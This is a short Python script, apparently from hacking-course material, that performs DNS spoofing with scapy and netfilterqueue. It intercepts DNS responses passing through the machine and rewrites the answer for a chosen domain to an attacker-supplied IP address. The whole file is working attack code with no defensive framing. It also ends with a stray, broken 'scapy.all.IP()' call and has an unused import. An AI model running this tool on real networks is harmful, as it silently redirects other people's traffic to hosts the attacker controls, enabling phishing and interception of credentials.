#!/usr/bin/env python3
import scapy.all as scapy
import netfilterqueue
import argparse
import difflib

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain-name", dest="domain_name", help="Domain name to spoof. EX : www.bing.com")
    parser.add_argument("-s", "--spoof-ip", dest="spoof_ip", help="IP to redirect. EX : 192.168.181.142")
    options = parser.parse_args()
    if not options.domain_name:
        parser.error("\n[-] Please specify a domain name to spoof, use --help for more info.")
    if not options.spoof_ip:
        parser.error("\n[-] Please specify an ip where to redirect, use --help for more info.")
    return options.domain_name, options.spoof_ip


options = get_arguments()
domain = options[0]
spoof_ip = options[1]


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if domain in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_ip)
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet[scapy.DNS].an = answer

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

scapy.all.IP()